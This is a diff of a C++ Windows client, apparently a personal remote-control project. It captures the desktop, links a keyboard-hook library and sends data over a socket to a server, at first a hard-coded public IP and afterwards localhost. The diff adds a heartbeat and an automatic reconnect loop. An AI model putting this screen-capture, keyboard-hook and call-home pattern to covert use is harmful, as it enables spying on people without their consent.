@@ -8,6 +8,7 @@
 #include<Windows.h>
 #pragma comment(lib,"ws2_32.lib")
 #include"DATA.h"
+#include<thread>
 #pragma comment(lib,"C:/Users/19100/Desktop/Remote/bin/HOOK.lib")
 using namespace std;
 int mykeyboardhook(HWND hwnd);
@@ -28,6 +29,9 @@ HINSTANCE hInst;                                // 当前实例
 WCHAR szTitle[MAX_LOADSTRING];                  // 标题栏文本
 WCHAR szWindowClass[MAX_LOADSTRING];            // 主窗口类名
 
+DWORD dwsendticket;   //最后发包时间戳
+DWORD dwrecvticket;  //最后收包时间戳
+HANDLE hevent = CreateEvent(NULL, false, false, NULL);
 
 bool ret;
 
@@ -39,10 +43,40 @@ HANDLE myhreadpipe;
 
 SOCKET s;
 
+DWORD WINAPI heartbeatthread(LPVOID lparam)
+{
+    bool bret = false;
+    char* pdata = NULL;
+    dwsendticket = GetTickCount();  //获取当前 发包 时间戳
+    dwrecvticket = GetTickCount();
+
+
+    while (true)
+    {
+        
+        if (GetTickCount() - dwrecvticket > HEART_BEAT_TIME * 2)
+        {
+            SetEvent(hevent);
+            /*closesocket(s);*/
+            break;
+        }
+        else if (GetTickCount() - dwrecvticket > HEART_BEAT_TIME)
+        {
+            senddatahead(s, Client_BEAT);
+            dwsendticket = GetTickCount();
+        }
+        Sleep(HEART_BEAT_TIME);
+
+    }
+
+    return true;
+
+}
+
 bool sendcapture(SOCKET s)
 {
     HWND hdesktop = NULL;
-    HDC hdesktopdc = NULL;
+    HDC hdesktopdc = NULL; //
     HDC hdc = NULL;
     HBITMAP hbitmap = NULL;
     char* pbitmapbuf = NULL;
@@ -64,12 +98,11 @@ bool sendcapture(SOCKET s)
 
         //创建DC
         hdc = CreateCompatibleDC(hdesktopdc);
-
-
-        //创建与桌面相兼容的位图
+        
         desktopwidth = GetSystemMetrics(SM_CXFULLSCREEN);
         desktopheight = GetSystemMetrics(SM_CYFULLSCREEN);
 
+        //创建与桌面相兼容的位图
         hbitmap = CreateCompatibleBitmap(hdesktopdc, desktopwidth, desktopheight);
 
         if (hbitmap == NULL)
@@ -150,8 +183,8 @@ bool sendcapture(SOCKET s)
 
 DWORD WINAPI recvandsendthread(LPVOID lparam)
 {
-    bool bret;
-    char* pdata;
+    bool bret = false;
+    char* pdata = NULL;
     while (true)
     {
         /*char rbuf[30] = { 0 };
@@ -161,8 +194,10 @@ DWORD WINAPI recvandsendthread(LPVOID lparam)
         //收取头部数据
         DATA drbuf;
         bret = recvdata(s, (char*)&drbuf, sizeof(unsigned int) * 2);
-        if (!bret) return 0;
+        if (bret <= 0) return 0;
         
+        dwrecvticket = GetTickCount();   //收到包 刷新最后收包时间戳
+
         //后面有数据继续收取
         if (drbuf.length >= 0)
         {
@@ -209,6 +244,11 @@ DWORD WINAPI recvandsendthread(LPVOID lparam)
 
         }
         if (pdata != NULL) delete [] pdata;
+
+        if (GetTickCount() - dwrecvticket > HEART_BEAT_TIME * 2)
+        {
+            break;
+        }
         
     }
 
@@ -322,20 +362,64 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
         );
     Sleep(300);
 
-    //1.socket
-    s = socket(AF_INET, SOCK_STREAM, 0);
-    //2.connet
-    sockaddr_in addr;
-    int length = sizeof(sockaddr_in);
-    addr.sin_family = AF_INET;
-
-
-    addr.sin_addr.S_un.S_addr = inet_addr("39.108.3.173");
-    addr.sin_port = htons(10087);
-
-    connect(s, (sockaddr*)&addr, length);
     
-    CreateThread(0, 0, recvandsendthread, 0, 0, 0);
+    std::thread mainthread([&] {
+
+        while (true)
+        {
+            //1.socket
+            s = socket(AF_INET, SOCK_STREAM, 0);
+            //2.connet
+            sockaddr_in addr;
+            int length = sizeof(sockaddr_in);
+            addr.sin_family = AF_INET;
+
+
+            addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
+            addr.sin_port = htons(10087);
+
+            connect(s, (sockaddr*)&addr, length);
+            //开启心跳包
+
+            //std::thread heartbeatthread([&] {
+            //    bool bret = false;
+            //    char* pdata = NULL;
+            //    DWORD dwsendticket = GetTickCount();  //获取当前 发包 时间戳
+            //    dwrecvticket = GetTickCount();
+
+
+            //    while (true)
+            //    {
+            //        if (GetTickCount() - dwsendticket > HEART_BEAT_TIME)
+            //        {
+            //            senddatahead(s, Client_BEAT);
+            //            dwsendticket = GetTickCount();
+            //        }
+
+            //        if (GetTickCount() - dwrecvticket > HEART_BEAT_TIME * 2)
+            //        {
+            //            SetEvent(hevent);
+            //            closesocket(s);
+            //            return;
+            //        }
+
+            //        Sleep(HEART_BEAT_TIME);
+            //    }
+            //    
+            //}); 
+
+            CreateThread(0, 0, recvandsendthread, 0, 0, 0);
+
+            CreateThread(0, 0, heartbeatthread, 0, 0, 0);
+
+            WaitForSingleObject(hevent, INFINITE);
+        }
+
+    });
+    mainthread.detach();
+   
+
+    
     //thread recvandsendthread([&]() {
 
 
